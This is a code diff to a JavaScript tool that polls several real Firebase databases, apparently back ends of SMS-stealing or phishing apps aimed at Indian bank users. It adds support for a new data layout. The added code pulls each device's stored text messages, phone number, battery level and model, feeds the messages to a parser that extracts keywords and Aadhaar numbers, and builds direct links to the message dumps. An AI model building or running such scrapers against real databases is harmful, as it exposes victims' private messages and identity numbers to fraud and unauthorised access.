@@ -218,8 +218,9 @@ const TARGETS = RAW_TARGETS.map(([id, url]) => ({
 // Schemas: 2 = clients+/messages/<did>, 9 = user_data+user_sms, 14 = merged
 // Schema 16 = /data/<did>{messages:[]} inline (newonline, masterp)
 // Schema 17 = flat /messages{id_did:{deviceID,message,dateTime}} (kwala, max2)
+// Schema 18 = /admins/default_admin_uid/clients/<did>{connection,heartbeat,messages[]} (spnew)
 const PP_RAW_TARGETS = [
-  [101, 'https://spnew-d98bc-default-rtdb.firebaseio.com',     2],
+  [101, 'https://spnew-d98bc-default-rtdb.firebaseio.com',     18],
   [102, 'https://yono-c281d-default-rtdb.firebaseio.com',      9],
   [103, 'https://sbifinal-4b241-default-rtdb.firebaseio.com',  2],
   [104, 'https://seccc-3702a-default-rtdb.firebaseio.com',     2],
@@ -439,6 +440,7 @@ async function pollTarget(target) {
     else if (schema === 13)                         mainEP = `${url}/admin.json`;
     else if (schema === 16)                         mainEP = `${url}/data.json`;
     else if (schema === 17)                         mainEP = `${url}/clients.json`;
+    else if (schema === 18)                         mainEP = `${url}/admins/default_admin_uid/clients.json`;
     else                                            mainEP = `${url}/All_Users.json`;
 
     const data = await fbFetch(mainEP);
@@ -503,6 +505,11 @@ async function pollTarget(target) {
           }
         }
       } catch {}
+    } else if (schema === 18) {
+      // /admins/default_admin_uid/clients/<did>{connection,heartbeat,messages,status}
+      // SMS inline at clients[did].messages keyed by timestamp: {address,body,date,type}
+      rawDevs = data && typeof data === 'object' ? data : {};
+      // SMS extracted inline per device in loop below
     } else {
       rawDevs = (data && typeof data === 'object') ? data : {};
     }
@@ -545,6 +552,8 @@ async function pollTarget(target) {
       if (schema === 4) dsms = dinfo.messages || {};
       // Schema 16: messages are INLINE inside data[did].messages
       if (schema === 16) dsms = dinfo.messages || {};
+      // Schema 18: messages are INLINE inside admins/.../clients[did].messages
+      if (schema === 18) dsms = dinfo.messages || {};
 
       const { actStr, foundKws, foundAadhars, maxTs } = parseSms(dsms, schema);
 
@@ -666,7 +675,6 @@ async function pollTarget(target) {
 
       } else if (schema === 16) {
         // /data/<did>: device info fields + inline messages sub-key
-        // SMS already set as dsms = dinfo.messages (handled below)
         s1    = dinfo.phoneNumber || dinfo.phone || dinfo.mobile || 'N/A';
         s2    = 'N/A';
         bat   = dinfo.battery != null ? String(dinfo.battery) : 'N/A';
@@ -674,14 +682,26 @@ async function pollTarget(target) {
         isOn  = dinfo.status === 'online' || dinfo.status === true || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
 
       } else if (schema === 17) {
-        // clients/<did>: device info; SMS already grouped in allSms by deviceID field
+        // /clients/<did>: device info; SMS already grouped in allSms by deviceID field
         s1    = dinfo.phoneNumber || dinfo.phone || dinfo.mobile || dinfo.sim1 || 'N/A';
         s2    = dinfo.sim2 || 'N/A';
         bat   = dinfo.battery != null ? String(dinfo.battery) : 'N/A';
         brand = dinfo.brand || dinfo.Brand || dinfo.model || dinfo.deviceName || dinfo.deviceId || 'Unknown';
         isOn  = dinfo.status === 'online' || dinfo.status === true || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
-        // Store the deviceId field as objId so SMS link can filter correctly
         objId = dinfo.deviceId || did;
+
+      } else if (schema === 18) {
+        // /admins/default_admin_uid/clients/<did>{connection,heartbeat,messages,status}
+        const conn = dinfo.connection || {};
+        const hb   = dinfo.heartbeat  || {};
+        const msgs18 = dinfo.messages || {};
+        const firstMsg = Object.values(msgs18)[0] || {};
+        s1    = firstMsg.address ? String(firstMsg.address).replace(/\D/g,'').slice(-10) : 'N/A';
+        s2    = 'N/A';
+        bat   = hb.batteryLevel != null ? `${hb.batteryLevel}%` : 'N/A';
+        brand = dinfo.deviceModel || dinfo.brand || 'Unknown';
+        isOn  = conn.status === 'connected' || dinfo.status === true
+                || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
       }
 
       upsertDevice(target, actualDid, {
@@ -745,6 +765,9 @@ function getSmsLink(target, deviceId, objId) {
   if (schema === 17) {
     // Server-side filtered endpoint — avoids needing Firebase index
     return `/api/url/${target.id}/device/${deviceId}/sms`;
+  }
+  if (schema === 18) {
+    return `${url}/admins/default_admin_uid/clients/${deviceId}/messages.json?print=pretty`;
   }
   if ([2,5,15,10,11].includes(schema)) return `${url}/messages/${deviceId}.json?print=pretty`;
   if (schema === '8a' || schema === '8b') {
